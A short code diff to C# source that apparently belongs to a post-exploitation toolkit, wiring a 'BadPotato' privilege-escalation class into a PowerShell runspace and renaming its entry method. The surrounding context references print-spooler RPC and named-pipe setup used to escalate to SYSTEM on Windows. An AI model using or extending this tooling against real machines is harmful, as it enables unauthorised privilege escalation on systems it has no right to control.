@@ -9,6 +9,7 @@ using System.Threading;
 using System.Reflection;
 using System.Collections.Generic;
 using static PingCastle.RPC.rprn;
+using System.Management.Automation.Runspaces;
 
 class Entry
 {
@@ -22,6 +23,10 @@ class Entry
     public static void pwncat( Assembly stage2) { 
         ProtocolError = stage2.GetType("stagetwo.Protocol.ProtocolError");
         stagetwo = stage2;
+
+        // Give the PowerShell context an understanding of our C# functions
+        var runspace = (Runspace)stagetwo.GetType("stagetwo.PowerShell").GetField("runspace", BindingFlags.Public | BindingFlags.Static).GetValue(null);
+        runspace.SessionStateProxy.SetVariable("RPCAPI", typeof(BadPotato));
     }
 }
 
@@ -72,7 +77,7 @@ class BadPotato
         throw (Exception)Activator.CreateInstance(Entry.ProtocolError,new object[] { exc.ErrorCode, exc.Message });
     }
 
-    public static Dictionary<string, object> bad_potato()
+    public static Dictionary<string, object> run()
     {
         SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
         string pipeName = Guid.NewGuid().ToString("N");
